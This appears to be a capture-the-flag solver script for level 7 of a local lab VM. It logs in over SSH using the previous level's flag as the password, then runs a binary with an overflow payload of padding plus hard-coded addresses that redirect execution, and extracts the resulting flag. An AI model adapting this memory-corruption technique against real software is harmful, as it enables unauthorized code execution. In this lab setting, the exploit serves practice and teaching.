#!/bin/bash

VM_ID='192.168.56.5'
ACTUAL_LEVEL=$(echo "$0" | grep --only --color=never --max-count=1 "level[0-9].sh" | head --lines=1 | grep --only --color=never --max-count=1 '[0-9]' | head --lines=1)

if [ -z "${ACTUAL_LEVEL}" ]; then
    echo "cannot get the level number of the actua level"
    exit 1
fi

PREVIOUS_LEVEL="$(( "${ACTUAL_LEVEL}" - 1))"

if [ ! -f "../../level${PREVIOUS_LEVEL}/flag" ]; then
    echo "../../level${PREVIOUS_LEVEL}/flag does not exist"
    exit 1
fi

act_level_password=$(cat "../../level${PREVIOUS_LEVEL}/flag")

flag=$(sshpass -p "${act_level_password}" ssh level${ACTUAL_LEVEL}@${VM_ID} -p 4242 './level7 "$(python -c "print \"A\"*20 + \"\x28\x99\x04\x08\"")" "$(echo -e "\xf4\x84\x04\x08")"' 2> /dev/null)

flag="$(echo ${flag} | head -n 1 | grep --only-matching --color=never '[a-z0-9]\{64,64\}' | head -n 1)"

echo -e "FLAG:\n${flag}"
